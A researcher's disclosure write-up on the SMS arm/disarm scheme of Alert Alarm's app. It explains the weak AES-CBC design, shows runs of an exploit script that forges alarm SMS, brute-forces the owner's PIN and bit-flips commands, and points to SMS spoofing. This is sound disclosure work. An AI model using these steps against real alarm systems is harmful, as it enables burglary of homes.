Alert Alarm SMS exploit
#######################
Author: Joakim Bech, 2019-06-21

.. contents:: Table of Contents

tl;dr;
******
- Alert Alert is a Swedish company selling burglar alarms (with various
  possibilities for extensions) to home owners. On one of their pages [1_],
  they are saying that: "Our burglar alarms for home owners communicate using
  an encrypted channel primarily using GSM and secondarily using SMS".

- It turns out that Alert Alarm have weaknesses in their SMS implementation
  that turns on/off alarms when using the Alert Alarm app (tested on Android).

  - Using AES-CBC which is malleable.
  - No integrity protection of the encrypted message.
  - Heavily reduced key space, from 128-bits to 9999 keys.
  - Doesn't use any device unique values/properties in the data being sent to
    the Alert Alarm server.
  - No key derivation function in use (KDF).
  - No key exchange protocol in use (like Diffie Hellman for example).

- This makes the security of the implementation very fragile, since all it
  takes for a rouge user is to get hold of a **single** SMS generated by the
  Alert Alarm app. When the attacker got that he can easily figure out the code
  used to turn on/off the burglar alarm. Using free services one can send
  `spoofed SMS`_ with manually crafted data.

- On this page, there is a script that can decrypt Alert Alarm SMS and also
  create SMS. It's also capable of finding a key using a brute force attack and
  it's also possible to flip bits to change the original intention with the SMS.

Observation
***********
This work started out when I noticed that when turning off an active alarm
(``ARMED_HOME``) using the Android app, a SMS is created similar to this.

.. figure:: images/aa_initial_sms.png
        :figclass: align-center


After reverse engineering the Android app one can see that the 64 bytes hex
string is made up of two parts. The first part is the IV, which is a random
number (coming from ``SHA1PRNG``) and the second part is the actual message.

.. code-block:: none

           32 bytes   32 bytes
        +-----------+----------+
        | IV        | Message  |
        +-----------+----------+

The encryption in use is AES-CBC with a 128-bit key. However, the key used for
encryption are made up of strings like this:

.. code-block:: none

        000000000000xxxx

Where "xxxx" is the pin code. This means the key space is heavily reduced from
128-bits, to only 9999 combinations(!). This is also plain AES-CBC, so no
integrity protection or anything, more about that further down.

Message format
==============
The format of the decrypted message is as follows:

.. code-block:: none

        Bytes:            1   1   1      2       1     2        2        2         2          2   = 16 bytes
                +-----------+---+---+------+---------+-----+------+--------+---------+----------+
                |SMS Version| i | j | year | month-1 | day | hour | minute | user id | \x00\x00 |
                +-----------+---+---+------+---------+-----+------+--------+---------+----------+
                                              (hex)

Here ``i`` is the alarm on (0) off (1) and ``j`` is (TODO).


Unconfirmed potential issues
****************************
- Is the solution susceptible to reply attacks? Is is possible to send the same
  message more than once? (TODO, this should be easy to verify).

- Will the server detect brute force attacks. I.e., can one send 9999 SMS in a
  short amount of time and thereby gain access to someones house?

Open questions
**************
- Why leverage on SMS from the app, when there already must be a data connection
  with the app? This means that it probably works something like this.
  - a) The SMS is sent to the server.
  - b) The server decrypts the SMS, checks the parameters, record the action
    and send out a request (using GSM) to the home owner main unit controlling
    the alarm.
  - c) When the alarm has been armed/disarmed, the Android app gets a
    notification of the updated status.
  Why on earth using SMS at all?


Script usage
************
Calling with script with no arguments lists all possible parameters. But to
make it easier to follow along, we've put together a couple of examples below.

Generate a SMS from scratch
===========================
This takes a default data string and creates a valid SMS string, i.e, a real
usable string that will turn on or off the alarm.

.. code-block:: bash

        $ ./aaxploit.py -e -p 1234
        [INFO]: Mode: encryption
        [INFO]: Original SMS:     False
        [INFO]: Msg:              32303131393532313039303230310000
        [INFO]: IV:               324e8a68e383f8d6f3117af17d7638fb
        [INFO]: Crafted SMS:      324e8a68e383f8d6f3117af17d7638fb6cee18510bd876b03b6131eddedb2713
        

.. _decrypt_sms:

Decrypt a SMS from the phone
============================
As an example, take the crafted SMS from the example above (having that said,
copy a SMS string from a phone works just as well). In this example we already
know the pin code to turn on/off the alarm and provide that as a parameter.

.. code-block:: bash

        $ ./aaxploit.py --input 324e8a68e383f8d6f3117af17d7638fb6cee18510bd876b03b6131eddedb2713 -d -p 1234
        [INFO]: Mode: decryption
        [INFO]: Original SMS:     324e8a68e383f8d6f3117af17d7638fb6cee18510bd876b03b6131eddedb2713
        [INFO]: Msg:              6cee18510bd876b03b6131eddedb2713
        [INFO]: IV:               324e8a68e383f8d6f3117af17d7638fb
        [INFO]: | sms_v | i | j | year | month | day | hour | minute | user_id |
        [INFO]:       2   0   1     19     0x5    21     09       02        01

Brute force an encrypted SMS
============================
Here we pretend that we don't know the key (i.e., the pin code to turn on/off
the alarm), but we have gotten hold of the encrypted SMS. By running the brute
force attack we try to find the correct key and pin to turn on/off the alarm.
Due to the nature of the encoded message, this always works and since the key
space is very small, it finds the key/pin in less than a second.

.. code-block:: bash

        $ ./aaxploit.py --input 324e8a68e383f8d6f3117af17d7638fb6cee18510bd876b03b6131eddedb2713 -d -b
        [INFO]: Mode: decryption
        [INFO]: Original SMS:     324e8a68e383f8d6f3117af17d7638fb6cee18510bd876b03b6131eddedb2713
        [INFO]: Msg:              6cee18510bd876b03b6131eddedb2713
        [INFO]: IV:               324e8a68e383f8d6f3117af17d7638fb
        [INFO]: Running bruteforce ...
        [INFO]: Probably the correct key: 30303030303030303030303031323334 gives pin: 1234

As we can see, we found the correct key/pin code! Note that the pin code is the
same as used on the real physical burgular alarm at the owner house. I.e., if a
thief break in he can enter this pin code and the alarm never goes off.

Flip a bit in the encrypted message
===================================
Since AES-CBC is malleable_, we can flip a bit in the IV which will be directly
reflected on the decrypted message. I.e., a man in the middle can use this to
either change a message from "Turn on alarm" to a "Turn off alarm" or vice
versa. Notice that here one doesn't even have to decrypt the message, i.e, by
just taking the original message and flip a bit and use the modified SMS is
enough to turn off (or turn on) the alarm.

.. code-block:: bash

        $ ./aaxploit.py --input 324e8a68e383f8d6f3117af17d7638fb6cee18510bd876b03b6131eddedb2713 -d --flip 112 
        [INFO]: Mode: decryption
        [INFO]: Original SMS:     324e8a68e383f8d6f3117af17d7638fb6cee18510bd876b03b6131eddedb2713
        [INFO]: Msg:              6cee18510bd876b03b6131eddedb2713
        [INFO]: IV:               324e8a68e383f8d6f3117af17d7638fb
        [INFO]: Modified SMS:     324f8a68e383f8d6f3117af17d7638fb6cee18510bd876b03b6131eddedb2713

If we take the "Modified SMS" and decrypt it, we can see that the "i" field has
been changed (from "0" to "1", compare with message above, see
:ref:`decrypt_sms`).

.. code-block:: bash

       $ ./aaxploit.py --input 324f8a68e383f8d6f3117af17d7638fb6cee18510bd876b03b6131eddedb2713 -d -p 1234 
       [INFO]: Mode: decryption
       [INFO]: Original SMS:     324f8a68e383f8d6f3117af17d7638fb6cee18510bd876b03b6131eddedb2713
       [INFO]: Msg:              6cee18510bd876b03b6131eddedb2713
       [INFO]: IV:               324f8a68e383f8d6f3117af17d7638fb
       [INFO]: | sms_v | i | j | year | month | day | hour | minute | user_id |
       [INFO]:       2   1   1     19     0x5    21     09       02        01
                        /\
                         |----- changed from 0 to 1

Summary
*******
The security of the solution relies on

1. the pin code and

2. the SMS senders phone number

3. that no-one is able to get hold of the SMS sent.

In fact, one can argue that **the security only relies on "3"**, since if one
get hold of "3", then it's trivial to figure out "1", that is basically what the
script ``aaxploit.py`` does. "2" on the other hand is typically available in
phone books etc, i.e., it's usually not hard to figure out the phone numbers to
the owner of a house.

Alert Alarm seems to have tried to "lock" the SMS service to a set of users.
I.e., the first user have to add additional phone number before these people can
use the app. So at first glance, one might believe that it's only the owners of
these phone numbers who can send the SMS. But the fact is that there are many
services out there that allow you to send `spoofed SMS`_ so it looks like they
were sent from a certain phone number. I.e., it's totally possible to craft a
SMS using ``aaxploit.py`` and then use one of these services to send a rouge
SMS. I.e., any user can turn of the alarm without the alarm owner knowing about
it.

**Should the owners of this alarm be worried?** Getting an SMS from the home
owner is probably a bit challenging, so it's probably a bit hard to actually do
the attack, at least if Alert Alarm hopefully notices brute force attacks on the
receiving side of the SMS. But, the flaws identified are quite serve, an I don't
want my burglar alarm to have these kind of weaknesses.

This document and the script will has been sent to Alert Alarm 2019-06-xx and
after 90 days disclosure time this will be made public.

.. _1: https://www.alertalarm.se/hemlarm/garanti-och-funktion.html#1
.. _malleable: https://en.wikipedia.org/wiki/Malleability_(cryptography)
.. _spoofed sms: https://www.google.com/search?q=send+spoofed+sms&oq=send+spoofed+sms
